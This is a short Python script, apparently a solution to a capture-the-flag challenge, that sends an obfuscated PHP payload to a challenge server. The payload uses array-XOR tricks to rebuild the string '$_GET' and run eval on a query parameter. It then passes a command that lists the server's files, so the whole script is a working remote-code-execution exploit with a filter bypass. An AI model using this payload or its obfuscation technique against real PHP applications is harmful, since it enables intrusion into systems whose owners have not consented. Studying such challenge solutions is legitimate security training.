import requests
import base64
import readline
import math
import time
import sys
import urllib


stuff = '''$a = [];
$aa = "$a$a";
$aaa = ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]);
$aaaaa = ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]);
$aaaaaa = "[][[]]";
$w = "$aaaaa$aaaaaa";
$t = $w  ^ ($aa)[$aaa];
$aaa = ([] ^ []);
$aaaa = ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]);
$w = "$aaa$aaaaaa";
$w = $w ^ "$aaaa$aaaaaa";
$e = $w ^ ($aa)[$aaa];
$e = "_G$e$t";
$aa = '$';
$aa ="$aa$e";
$w='["e"]';
$aa = "$aa$w";
eval("eval($aa);");
'''

stuff = urllib.parse.quote(stuff)

cmd = 'foreach (scandir(".") as $v) echo $v."\n";';
cmd = urllib.parse.quote(cmd)
url = 'https://until-the-end.secchallenge.crysys.hu'
r = requests.get(f'{url}?e={cmd}&%2b={stuff}')
resp = r.text
print(resp)
